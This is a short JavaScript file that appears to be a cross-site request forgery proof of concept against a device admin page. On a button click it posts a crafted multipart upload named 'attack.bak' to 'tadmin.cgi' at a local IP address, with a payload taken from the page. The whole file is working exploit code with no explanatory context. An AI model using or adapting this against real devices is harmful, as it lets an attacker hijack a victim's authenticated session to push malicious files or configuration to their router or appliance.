function sendData() {
  var XHR = new XMLHttpRequest();
  var url = "http://10.3.1.3/tadmin.cgi";
  attack_content = document.getElementById("attack_string").innerHTML;
  request_content = "------WebKitFormBoundaryjS2RaK3yh4DE8frf\r\n" + 
										'Content-Disposition: form-data; name="submit_button"\r\n\r\n' +
										"Traff_admin\r\n" +
										"------WebKitFormBoundaryjS2RaK3yh4DE8frf\r\n" +
										'Content-Disposition: form-data; name="file"; filename="attack.bak"\r\n' +
										"Content-Type: application/x-trash\r\n\r\n" +
										attack_content + "\r\n" + 
										"------WebKitFormBoundaryjS2RaK3yh4DE8frf--\r\n"

  // Set up our request
  XHR.open('POST', url);

  // Set the content type
  XHR.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryjS2RaK3yh4DE8frf");

  // Submit the form
  XHR.send(request_content);
}


window.onload = function() {
	var button = document.getElementById("csrf-button");
	button.onclick = function() {
		sendData();
	}
}